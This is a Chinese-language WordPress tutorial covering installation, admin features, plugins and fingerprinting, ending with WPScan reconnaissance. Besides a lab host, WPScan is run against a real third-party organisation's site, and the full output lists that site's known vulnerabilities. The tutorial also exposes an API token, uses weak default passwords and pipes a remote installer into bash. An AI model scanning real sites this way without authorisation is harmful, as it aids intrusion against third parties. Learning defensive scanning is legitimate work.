 

# WordPress系统

##  01.基本介绍

### 基本介绍：认识

WordPress 起源于 2003 年，由 Matt Mullenweg ( 马特·穆伦维格) 和 Mike Little( 迈克·利特尔) 联合开发，最初是基于一个b2/cafelog 的博客发展而来。

作为开源项目，WordPress 迅速发展，成为全球最受欢迎的内容管理系统 (CMS)。

它的核心特点是易用性强、扩展性好、社区庞大。即便不会开发的普通人通过简单的配置插件和主题，也可以轻松定制和扩展功能，适应各种网站需求。

### 基本介绍：组成部分

1. 01.用户界面

   如WordPress仪表板、管理栏等

2. 02.主题

   自定义网站外观和样式的设计文

3. 03.插件

   扩展网站功能的微型程序

![image-20241105101538209](https://image.201068.xyz/assets/11.Wordpress/image-20241105101538209.png)

### 基本介绍：应用场景与优势

1. 01.应用场景博客、新闻、电商、企业门户社区和论坛、各类公益性网站

2. 02.优势多功能、简便性、免费与开源、安全性

![image-20241105101551995](https://image.201068.xyz/assets/11.Wordpress/image-20241105101551995.png)

### 基本介绍：著名站点

![image-20241105094741286](https://image.201068.xyz/assets/11.Wordpress/image-20241105094741286.png)

## 02.环境安装 

### 环境介绍

#### 配置PHP与MySQL

- 推荐PHP8.2
- MySQL8.0

#### 推荐工具

- WAMP（Windows）

- MAMP（Mac）

- LINUX （宝塔）


### 安装步骤

1. 01.安装Web服务器环境

   Apache、MySQL、PHP集成环境

2. 02.下载WordPress
   解压到Web服务器根目录

3. 03.配置数据库
   创建数据库，配置wp-config.php

4. 04.完成安装
   通过浏览器访问，按提示完成

### wamp下载

 官网地址：https://www.wampserver.com/

![image-20241105101650658](https://image.201068.xyz/assets/11.Wordpress/image-20241105101650658.png)

 分发地址：http://192.168.1.38/wampserver.zip

### wamp安装和配置

#### 正常安装

正常安装双击打开，点击同意协议

![image-20241105101706842](https://image.201068.xyz/assets/11.Wordpress/image-20241105101706842.png)

#### vc下载

http://192.168.1.38/vc.rar

![image-20241105101717178](https://image.201068.xyz/assets/11.Wordpress/image-20241105101717178.png)

#### 选择安装地址

建议在`D:`或其他数据盘

![image-20241105101804055](https://image.201068.xyz/assets/11.Wordpress/image-20241105101804055.png)

#### 选择默认浏览器和开发软件 

为wamp选择默认浏览器和开发软件。

![image-20241105101818508](https://image.201068.xyz/assets/11.Wordpress/image-20241105101818508.png)

#### 切换中文

右下角图标右键，选择language->chinese,切换成中文使用。

![image-20241105101830499](https://image.201068.xyz/assets/11.Wordpress/image-20241105101830499.png)

#### 访问

访问http://localhost，看到如下图。

![image-20241105101902868](https://image.201068.xyz/assets/11.Wordpress/image-20241105101902868.png)

### wordpress下载和安装

#### 下载

下载地址：https://wordpress.org/download/

![image-20241105101926766](https://image.201068.xyz/assets/11.Wordpress/image-20241105101926766.png)

#### 更新数据库密码

用PhpMyAdmin更新数据库密码。

选择mysql库，执行命令

```bash
alter user 'root'@'localhost' identified by '123456';
```

![image-20241105102045614](https://image.201068.xyz/assets/11.Wordpress/image-20241105102045614.png)

#### 创建wordpress数据库

> wordpress
>
> utf8mb4 unicode_ci

![image-20241105102257885](https://image.201068.xyz/assets/11.Wordpress/image-20241105102257885.png)

#### 源码放到wamp目录

下载之后解压wordpress到wamp目录下

![image-20241105102322116](https://image.201068.xyz/assets/11.Wordpress/image-20241105102322116.png)

#### 编辑httpd-vhosts.conf

编辑apache 下 `httpd-vhosts.conf`

![image-20241105102336515](https://image.201068.xyz/assets/11.Wordpress/image-20241105102336515.png)

![image-20241105095353232](https://image.201068.xyz/assets/11.Wordpress/image-20241105095353232.png)

#### 编辑hosts文件 

```bash
C:\Windows\System32\drivers\etc\hosts
```

添加一条记录 

> 127.0.0.1 wordpress.cn

![image-20241105102427342](https://image.201068.xyz/assets/11.Wordpress/image-20241105102427342.png)

重启wamp服务



#### 选择语言简体中文

![image-20241105102448802](https://image.201068.xyz/assets/11.Wordpress/image-20241105102448802.png)

#### 按照要求填写数据库配置

![image-20241105102531160](https://image.201068.xyz/assets/11.Wordpress/image-20241105102531160.png)

> wordpress
>
> wordpress / 123456

#### 设置基础配置和创建默认管理员账号密码

![image-20241105102611068](https://image.201068.xyz/assets/11.Wordpress/image-20241105102611068.png)

> admin / 123456

### wordpress目录结构

![image-20241105102709073](https://image.201068.xyz/assets/11.Wordpress/image-20241105102709073.png)

### wordpress数据库表结构

![image-20241105102720344](https://image.201068.xyz/assets/11.Wordpress/image-20241105102720344.png)

### 登录

> /wp-login.php

http://192.168.70.10:8102/wp-login.php

> admin / 123456

![image-20241105103316320](https://image.201068.xyz/assets/11.Wordpress/image-20241105103316320.png)

## 03.功能介绍 

### 仪表盘

wordpress主要功能为仪表盘、文章、媒体、页面、评论、外观、插件、用户、工具、设置10个栏目。

> /wp-admin/

![image-20241105103251702](https://image.201068.xyz/assets/11.Wordpress/image-20241105103251702.png)

### 文章

wordpress的文章主要是文章的管理和文章分类的管理以及对文章打标签的管理。

> /wp-admin/edit.php

![image-20241105103350214](https://image.201068.xyz/assets/11.Wordpress/image-20241105103350214.png)

### 媒体库

wordpress的媒体库就是对上传的图片、音乐、视频、文件等的集中管理。

> /wp-admin/upload.php

![image-20241105103522665](https://image.201068.xyz/assets/11.Wordpress/image-20241105103522665.png)

### 页面

wordpress的页面，可以根据需要单独制作或引用文章列表。

> /wp-admin/edit.php?post_type=page

![image-20241105103603373](https://image.201068.xyz/assets/11.Wordpress/image-20241105103603373.png)

### 评论

wordpress的评论是对站点中用户的评论内容进行管理，包括一些回复和删除等操作。

> /wp-admin/edit-comments.php

![image-20241105103633748](https://image.201068.xyz/assets/11.Wordpress/image-20241105103633748.png)

### 主题外观

WordPress主题是WordPress网站的模板，它包含了网站的布局、颜色、字体、图像等视觉元素以及与WordPress核心功能集成的代码，主要作用是决定网站的外观和风格，并可通过内置的功能和选项提供用户个性化的网站体验。

> /wp-admin/themes.php

![image-20241105103740629](https://image.201068.xyz/assets/11.Wordpress/image-20241105103740629.png)

### 插件

 WordPress插件是用于扩展和增强网站的功能，包括优化性能、提升安全性、改善用户体验、集成第三方服务等，是WordPress生态系统的重要组成部分，使网站所有者能够轻松定制和扩展其在线平台。

> /wp-admin/plugins.php

![image-20241105103801056](https://image.201068.xyz/assets/11.Wordpress/image-20241105103801056.png)

### 用户

 WordPress用户是对网站管理者的一个管理。比如管理员，作者等。

```bash
/wp-admin/users.php
```

![image-20241105103817581](https://image.201068.xyz/assets/11.Wordpress/image-20241105103817581.png)

### 工具

 WordPress工具主要是站点的导入导出，以及站点监控。

> /wp-admin/tools.php

![image-20241105103856398](https://image.201068.xyz/assets/11.Wordpress/image-20241105103856398.png)

### 设置

 WordPress设置是对整个网站的初始化信息进行管理。

> /wp-admin/options-general.php

![image-20241105103938225](https://image.201068.xyz/assets/11.Wordpress/image-20241105103938225.png)

## 04.插件与主题

### 插件

####  WPS Hide Login


安装并启用后，可根据自己的需求更改后台登录地址，从而隐藏自己的后台登录地址。

设置完成后再次访问`wp-admin`或`wp-login.php`直接跳转到**404页面**，从而达到**隐藏后台**的效果。

![image-20241105104225513](https://image.201068.xyz/assets/11.Wordpress/image-20241105104225513.png)

![image-20241105104420949](https://image.201068.xyz/assets/11.Wordpress/image-20241105104420949.png)

#### WPForms Lite

 用于快速**增加自定义表单**，根据需求创建收集信息。

![image-20241105104754792](https://image.201068.xyz/assets/11.Wordpress/image-20241105104754792.png)

![image-20241105105116895](https://image.201068.xyz/assets/11.Wordpress/image-20241105105116895.png)

![image-20241105105059325](https://image.201068.xyz/assets/11.Wordpress/image-20241105105059325.png)



#### Yoast SEO

![image-20241105105220632](https://image.201068.xyz/assets/11.Wordpress/image-20241105105220632.png)

安装完成后，会在网站的根目录下生成`sitemap_index.xml`,用于搜索引擎的收录。

> /index.php/sitemap_index.xml

![image-20241105111629173](https://image.201068.xyz/assets/11.Wordpress/image-20241105111629173.png)

![image-20241105111512102](https://image.201068.xyz/assets/11.Wordpress/image-20241105111512102.png)

![image-20241105111506712](https://image.201068.xyz/assets/11.Wordpress/image-20241105111506712.png)

针对网站基本信息进行seo优化

![image-20241105111258655](https://image.201068.xyz/assets/11.Wordpress/image-20241105111258655.png)

针对网站的文章和单独页面可进行seo优化

![image-20241105111229452](https://image.201068.xyz/assets/11.Wordpress/image-20241105111229452.png)

![image-20241105111139588](https://image.201068.xyz/assets/11.Wordpress/image-20241105111139588.png)

#### 健康检查与故障排除

![image-20241105111719971](https://image.201068.xyz/assets/11.Wordpress/image-20241105111719971.png)

安装完成后可看到增加故障排除和工具栏，可利用工具进行邮件、文件等检查。

![image-20241105111924076](https://image.201068.xyz/assets/11.Wordpress/image-20241105111924076.png)


打开故障排除按钮，不能进行插件的安装，当排除故障后关闭才能进行插件的管理。

![image-20241105111953212](https://image.201068.xyz/assets/11.Wordpress/image-20241105111953212.png)

![image-20241105112009014](https://image.201068.xyz/assets/11.Wordpress/image-20241105112009014.png)

#### AddToAny分享按钮


非常便利的一个分享到其他平台的插件。

![image-20241105112040030](https://image.201068.xyz/assets/11.Wordpress/image-20241105112040030.png)

![image-20241105112139399](https://image.201068.xyz/assets/11.Wordpress/image-20241105112139399.png)

####  UpdraftPlus 站点备份和恢复工具


updraftplus 能够自动化备份站点，通过简单的配置能够实现远程备份。

![image-20241105112211693](https://image.201068.xyz/assets/11.Wordpress/image-20241105112211693.png)

![image-20241105112337199](https://image.201068.xyz/assets/11.Wordpress/image-20241105112337199.png)

updraftplus 高级版本功能，需要购买授权使用。

![image-20241105112345594](https://image.201068.xyz/assets/11.Wordpress/image-20241105112345594.png)

### 主题

#### 主题管理

> /wp-admin/themes.php

![image-20241105112439049](https://image.201068.xyz/assets/11.Wordpress/image-20241105112439049.png)

#### 主题自动化安装

> /wp-admin/theme-install.php?browse=popular


![image-20241105112607558](https://image.201068.xyz/assets/11.Wordpress/image-20241105112607558.png)

#### 主题导入


主题本地上传导入

![image-20241105112650595](https://image.201068.xyz/assets/11.Wordpress/image-20241105112650595.png)

![image-20241105112726971](https://image.201068.xyz/assets/11.Wordpress/image-20241105112726971.png)

![image-20241105112740008](https://image.201068.xyz/assets/11.Wordpress/image-20241105112740008.png)

## 05.系统识别 

### 自己测试

#### 1.访问常见路径

根据wordpress特点，访问常见路径，比如：

> /wp-admin/
>
> /wp-login.php

http://192.168.70.10:8102/wp-admin/

![image-20241105112827919](https://image.201068.xyz/assets/11.Wordpress/image-20241105112827919.png)

http://192.168.70.10:8102/wp-login.php

![image-20241105112844035](https://image.201068.xyz/assets/11.Wordpress/image-20241105112844035.png)

#### 2.查看readme文件

> /readme.html

http://192.168.70.10:8102/readme.html

![image-20241105113031751](https://image.201068.xyz/assets/11.Wordpress/image-20241105113031751.png)

#### 3.查看网站源代码

打开开发者工具，查看网站源代码,查找关键词`wp-content`、`wp-admin`、`wp-includes` 等。

![image-20241105113132948](https://image.201068.xyz/assets/11.Wordpress/image-20241105113132948.png)

#### 4.检查网站的CSS或JavaScript文件

> /wp-content/themes/（主题文件）
>
> /wp-content/plugins/（插件文件）

![image-20241105113307259](https://image.201068.xyz/assets/11.Wordpress/image-20241105113307259.png)

![image-20241105113240187](https://image.201068.xyz/assets/11.Wordpress/image-20241105113240187.png)

### 资产收集搜索：fofa识别

通过fofa等软件搜索关键词

```bash
"wordpress" && country="CN"
```

![image-20241105115500169](https://image.201068.xyz/assets/11.Wordpress/image-20241105115500169.png)

### 工具识别：wpscan

WPScan 是一款用于检测 WordPress 网站安全漏洞的开源工具，

主要功能包括扫描 WordPress 核心、插件和主题中的已知漏洞，枚举网站用户信息，以及检测弱口令。

它通过其定期更新的漏洞数据库，帮助站点管理员识别潜在的安全风险，预防恶意攻击。

官网：www.wpscan.com

github：https://github.com/wpscanteam/wpscan

RVM：https://rvm.io/rvm/install

#### 安装

> kali自带

```bash
gpg --keyserver keyserver.ubuntu.com --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3 7D2BAF1CF37B13E2069D6956105BD0E739499BDB
curl -sSL https://get.rvm.io | bash
gem install wpscan
```

#### 命令

```bash
wpscan -h		#帮助
wpscan --updata	#更新
wpscan -e vp			#扫描插件漏洞
wpscan -e ap			#扫描所有插件
wpscan -e p				#扫描流行插件
wpscan -e vt			#扫描主题漏洞
wpscan -e at			#扫描所有主题
wpscan -e t				#扫描流行主题
wpscan -U				#爆破指定的用户列表
wpscan -P				#爆破指定的密码字典

wpscan --url http://192.168.70.10:8102
```

![image-20241105121128764](https://image.201068.xyz/assets/11.Wordpress/image-20241105121128764.png)


扫描完成后能看到站点有哪些文件信息泄露，使用了哪些插件和主题。插件和主题包含了版本和作者以及准确度等信息。

#### 注册wpscan账号并激活登录

![image-20241105120357430](https://image.201068.xyz/assets/11.Wordpress/image-20241105120357430.png)

#### 获取wpscan的token

https://wpscan.com/profile/

![image-20241105120826427](https://image.201068.xyz/assets/11.Wordpress/image-20241105120826427.png)

用于 `--api-token` 参数使用

![image-20241105122512634](https://image.201068.xyz/assets/11.Wordpress/image-20241105122512634.png)

#### 运行wpscan

##### http://192.168.70.10:8102

```bash
wpscan --url http://192.168.70.10:8102 --api-token e4c5sF3ssFTtMKQQOXrqdZMUsdFq09NPmF0xB55KPx8

wpscan --url https://jsaa.or.jp --api-token e4c5sF3ssFTtMKQQOXrqdZMUsdFq09NPmF0xB55KPx8

wpscan --url https://jsaa.or.jp --api-token e4c5sF3ssFTtMKQQOXrqdZMUsdFq09NPmF0xB55KPx8
```

使用后可以查看到漏洞信息，包括插件名称，版本，漏洞，修复版本号以及一些信息。

![image-20241105122939602](https://image.201068.xyz/assets/11.Wordpress/image-20241105122939602.png)

![image-20241105123034545](https://image.201068.xyz/assets/11.Wordpress/image-20241105123034545.png)

![image-20241105123013233](https://image.201068.xyz/assets/11.Wordpress/image-20241105123013233.png)

```bash
┌──(root㉿kali)-[~]
└─# wpscan --url http://192.168.70.10:8102 --api-token e4c5sF3ssFTtMKQQOXrqdZMUsdFq09NPmF0xB55KPx8
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://192.168.70.10:8102/ [192.168.70.10]
[+] Started: Tue Nov  5 12:28:32 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: nginx/1.15.11
 |  - X-Powered-By: PHP/7.4.3
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://192.168.70.10:8102/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.70.10:8102/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.70.10:8102/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.70.10:8102/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

Fingerprinting the version - Time: 00:00:05 <================================================================> (702 / 702) 100.00% Time: 00:00:05
[i] The WordPress version could not be detected.

[+] WordPress theme in use: rk-blogger
 | Location: http://192.168.70.10:8102/wp-content/themes/rk-blogger/
 | Readme: http://192.168.70.10:8102/wp-content/themes/rk-blogger/readme.txt
 | Style URL: http://192.168.70.10:8102/wp-content/themes/rk-blogger/style.css
 | Style Name: RK blogger
 | Style URI: https://www.wbolt.com/themes/rk-blogger
 | Description: RK blogger这款主题是基于软矿博客的主题进行深加工的免费WordPress主题，在不...
 | Author: 闪电博
 | Author URI: http://www.wbolt.com
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 2.0.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.70.10:8102/wp-content/themes/rk-blogger/style.css, Match: 'Version:     2.0.0'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] add-to-any
 | Location: http://192.168.70.10:8102/wp-content/plugins/add-to-any/
 | Latest Version: 1.8.12 (up to date)
 | Last Updated: 2024-10-25T23:14:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.8.12 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.70.10:8102/wp-content/plugins/add-to-any/README.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.70.10:8102/wp-content/plugins/add-to-any/README.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:01:01 <==================================================================> (137 / 137) 100.00% Time: 00:01:01

[i] No Config Backups Found.

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 2
 | Requests Remaining: 23

[+] Finished: Tue Nov  5 12:30:00 2024
[+] Requests Done: 1557
[+] Cached Requests: 8
[+] Data Sent: 431.847 KB
[+] Data Received: 50.75 MB
[+] Memory used: 275.531 MB
[+] Elapsed time: 00:01:28
```

##### https://jsaa.or.jp

![image-20241105142223841](https://image.201068.xyz/assets/11.Wordpress/image-20241105142223841.png)

```bash
┌──(root㉿kali)-[~]
└─# wpscan --url https://jsaa.or.jp --api-token e4c5sF3ssFTtMKQQOXrqdZMUsdFq09NPmF0xB55KPx8
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: https://jsaa.or.jp/ [150.60.67.225]
[+] Started: Tue Nov  5 14:13:42 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache
 |  - X-Powered-By: PHP/5.5.16
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://jsaa.or.jp/wp/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: https://jsaa.or.jp/wp/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: https://jsaa.or.jp/wp/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.7.26 identified (Insecure, released on 2023-05-16).
 | Found By: Rss Generator (Passive Detection)
 |  - https://jsaa.or.jp/feed/, <generator>https://wordpress.org/?v=4.7.26</generator>
 | Confirmed By: Emoji Settings (Passive Detection)
 |  - https://jsaa.or.jp/, Match: '-release.min.js?ver=4.7.26'
 |
 | [!] 9 vulnerabilities identified:
 |
 | [!] Title: WP < 6.3.2 - Denial of Service via Cache Poisoning
 |     Fixed in: 4.7.27
 |     References:
 |      - https://wpscan.com/vulnerability/6d80e09d-34d5-4fda-81cb-e703d0e56e4f
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WP < 6.3.2 - Subscriber+ Arbitrary Shortcode Execution
 |     Fixed in: 4.7.27
 |     References:
 |      - https://wpscan.com/vulnerability/3615aea0-90aa-4f9a-9792-078a90af7f59
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WP < 6.3.2 - Contributor+ Comment Disclosure
 |     Fixed in: 4.7.27
 |     References:
 |      - https://wpscan.com/vulnerability/d35b2a3d-9b41-4b4f-8e87-1b8ccb370b9f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39999
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WP < 6.3.2 - Unauthenticated Post Author Email Disclosure
 |     Fixed in: 4.7.27
 |     References:
 |      - https://wpscan.com/vulnerability/19380917-4c27-4095-abf1-eba6f913b441
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-5561
 |      - https://wpscan.com/blog/email-leak-oracle-vulnerability-addressed-in-wordpress-6-3-2/
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.4.3 - Deserialization of Untrusted Data
 |     Fixed in: 4.7.28
 |     References:
 |      - https://wpscan.com/vulnerability/5e9804e5-bbd4-4836-a5f0-b4388cc39225
 |      - https://wordpress.org/news/2024/01/wordpress-6-4-3-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.4.3 - Admin+ PHP File Upload
 |     Fixed in: 4.7.28
 |     References:
 |      - https://wpscan.com/vulnerability/a8e12fbe-c70b-4078-9015-cf57a05bdd4a
 |      - https://wordpress.org/news/2024/01/wordpress-6-4-3-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in HTML API
 |     Fixed in: 4.7.29
 |     References:
 |      - https://wpscan.com/vulnerability/2c63f136-4c1f-4093-9a8c-5e51f19eae28
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in Template-Part Block
 |     Fixed in: 4.7.29
 |     References:
 |      - https://wpscan.com/vulnerability/7c448f6d-4531-4757-bff0-be9e3220bbbb
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Path Traversal in Template-Part Block
 |     Fixed in: 4.7.29
 |     References:
 |      - https://wpscan.com/vulnerability/36232787-754a-4234-83d6-6ded5e80251c
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/

[+] WordPress theme in use: jsaa-2017
 | Location: https://jsaa.or.jp/wp/wp-content/themes/jsaa-2017/
 | Readme: https://jsaa.or.jp/wp/wp-content/themes/jsaa-2017/readme.txt
 | Style URL: https://jsaa.or.jp/wp/wp-content/themes/jsaa-2017/style.css?ver=4.7.26
 | Style Name: jsaa 2017
 | Style URI: http://underscores.me/
 | Description: Custom theme: jsaa 2017, developed by jsaa...
 | Author: jsaa
 | Author URI: http://underscores.me/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.0.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://jsaa.or.jp/wp/wp-content/themes/jsaa-2017/style.css?ver=4.7.26, Match: 'Version: 1.0.0'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] css-live
 | Location: https://jsaa.or.jp/wp/wp-content/plugins/css-live/
 | Latest Version: 1.3 (up to date)
 | Last Updated: 2016-09-16T12:26:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://jsaa.or.jp/wp/wp-content/plugins/css-live/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - https://jsaa.or.jp/wp/wp-content/plugins/css-live/readme.txt

[+] easy-fancybox
 | Location: https://jsaa.or.jp/wp/wp-content/plugins/easy-fancybox/
 | Last Updated: 2024-10-28T21:11:00.000Z
 | [!] The version is out of date, the latest version is 2.3.5
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By:
 |  Urls In 404 Page (Passive Detection)
 |  Comment (Passive Detection)
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: Easy Fancybox < 1.8.18 - Authenticated Stored XSS
 |     Fixed in: 1.8.18
 |     References:
 |      - https://wpscan.com/vulnerability/b412d6e3-e617-4ec2-84fc-103e75cb3d38
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16524
 |      - https://github.com/sbaresearch/advisories/tree/public/2019/SBA-ADV-20190911-01_Easy_FancyBox_WP_Plugin_Stored_XSS
 |
 | [!] Title: Firelight Lightbox < 2.3.4 - Authenticated (Author+) Stored Cross-Site Scripting
 |     Fixed in: 2.3.4
 |     References:
 |      - https://wpscan.com/vulnerability/b0a0d210-6289-4d9b-b9e9-8f93823f180f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-50460
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/e69392a8-da0a-47af-b851-0bc36727ff5a
 |
 | Version: 1.5.8.2 (100% confidence)
 | Found By: Comment (Passive Detection)
 |  - https://jsaa.or.jp/, Match: 'Easy FancyBox 1.5.8.2 using'
 | Confirmed By:
 |  Query Parameter (Passive Detection)
 |   - https://jsaa.or.jp/wp/wp-content/plugins/easy-fancybox/fancybox/jquery.fancybox-1.3.8.min.css?ver=1.5.8.2
 |   - https://jsaa.or.jp/wp/wp-content/plugins/easy-fancybox/fancybox/jquery.fancybox-1.3.8.min.js?ver=1.5.8.2
 |  Readme - Stable Tag (Aggressive Detection)
 |   - https://jsaa.or.jp/wp/wp-content/plugins/easy-fancybox/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - https://jsaa.or.jp/wp/wp-content/plugins/easy-fancybox/readme.txt

[+] elementor
 | Location: https://jsaa.or.jp/wp/wp-content/plugins/elementor/
 | Last Updated: 2024-10-30T13:11:00.000Z
 | [!] The version is out of date, the latest version is 3.25.3
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 31 vulnerabilities identified:
 |
 | [!] Title: Elementor Page Builder < 1.8.0 - Authenticated Unrestricted Editing
 |     Fixed in: 1.8.0
 |     References:
 |      - https://wpscan.com/vulnerability/380cdc06-642d-4086-9ad6-d4bdbd305e71
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-18596
 |      - https://www.pritect.net/blog/elementor-page-builder-1-8-allows-logged-users-unrestricted-editing
 |
 | [!] Title: Elementor Page Builder < 2.8.5 - Authenticated Reflected XSS
 |     Fixed in: 2.8.5
 |     References:
 |      - https://wpscan.com/vulnerability/e1422824-adba-4d7c-a7f3-c0a6b3ab0232
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8426
 |      - https://blog.impenetrable.tech/xss-in-wordpress-elementor-plugin
 |
 | [!] Title: Elementor Page Builder < 2.7.7 - Authenticated Stored XSS
 |     Fixed in: 2.7.7
 |     References:
 |      - https://wpscan.com/vulnerability/2bcf7eb7-cddb-4d6a-8789-43dd3dff4dcf
 |      - https://labs.sucuri.net/stored-xss-in-elementor/
 |
 | [!] Title: Elementor Page Builder < 2.9.6 - Authenticated Safe Mode Privilege Escalation
 |     Fixed in: 2.9.6
 |     References:
 |      - https://wpscan.com/vulnerability/7120f212-0c04-4c41-b6a8-32a380c0c25d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-20634
 |      - https://blog.nintechnet.com/wordpress-elementor-plugin-fixed-safe-mode-privilege-escalation-vulnerability/
 |      - https://github.com/elementor/elementor/commit/2204e9ecb02a764e4e4fed49f28d8af7534b9392
 |
 | [!] Title: Elementor < 2.9.8 - SVG Sanitizer Bypass leading to Authenticated Stored XSS
 |     Fixed in: 2.9.8
 |     References:
 |      - https://wpscan.com/vulnerability/e601fc58-97a0-4a67-8955-abf0e37e74ae
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-36703
 |      - https://blog.nintechnet.com/wordpress-elementor-plugin-fixed-svg-xss-protection-bypass-vulnerability/
 |
 | [!] Title: Elementor < 2.7.5 - Authenticated Arbitrary File Upload
 |     Fixed in: 2.7.5
 |     References:
 |      - https://wpscan.com/vulnerability/3b7e04de-e23f-4cf9-a9bf-2cf4cbc8c538
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7055
 |      - https://pentest.co.uk/labs/advisory/cve-2020-7055/
 |      - https://pentest.co.uk/labs/vulnerability-disclosure-cve-2020-7055/
 |      - https://www.youtube.com/watch?v=3MYygBMisQs
 |
 | [!] Title: Elementor Page Builder < 2.9.10 - Authenticated Stored XSS
 |     Fixed in: 2.9.10
 |     References:
 |      - https://wpscan.com/vulnerability/31659b56-2046-4be8-887f-a016da138595
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13864
